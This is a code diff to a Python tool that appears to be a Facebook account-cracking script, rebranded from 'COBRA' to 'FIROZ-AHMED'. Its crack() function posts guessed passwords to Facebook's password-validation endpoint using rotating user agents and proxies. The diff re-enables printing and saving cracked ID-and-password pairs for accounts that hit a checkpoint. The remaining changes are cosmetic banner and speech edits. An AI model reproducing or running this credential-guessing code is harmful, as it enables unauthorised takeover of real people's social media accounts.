@@ -171,9 +171,9 @@ while attemps < 12345677901:
 os.system('clear')
 #------------------[ MAIN ]-----------------#
 
-os.system('espeak -a 300 " Your,   Real,  Name,"')
+os.system('espeak -a 300 " Your   Real  Name"')
 NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  COBRA,  BOSS,  Tools"')
+os.system('espeak -a 300 " Welcome,   to,  FIROZ,  AHMED,  Tools"')
 os.system('xdg-open https://www.facebook.com/firoz.ahmed5678')
 def banner():
 	os.system("clear")
@@ -412,8 +412,8 @@ def setting():
 		for bacot in id:
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
-	print('\x1b[1;92m LOGIN SEXY\n\x1b[1;97m [1] THE ONLY METHOD  ')
-	os.system('espeak -a 300 " 1,  the,  only, method"')
+	print('\x1b[1;92m LOGIN \n\x1b[1;97m METHOD[1]  ')
+	os.system('espeak -a 300 " choose, method, 1"')
 	hc = input(' CHOOSE: ')
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -484,7 +484,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo}[COBRA-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
+	sys.stdout.write(f"\r{bo}[FIROZ-AHMED] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -502,9 +502,9 @@ def crack(idf,pwv):
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#COBRA-BOSS
-				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•COBRA-Cp] {idf} • {pw}')     
+				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•COBRA-Cp] {idf} • {pw}')     
 				os.system('espeak -a 300 " C,  P"')
-			    #open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+			    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
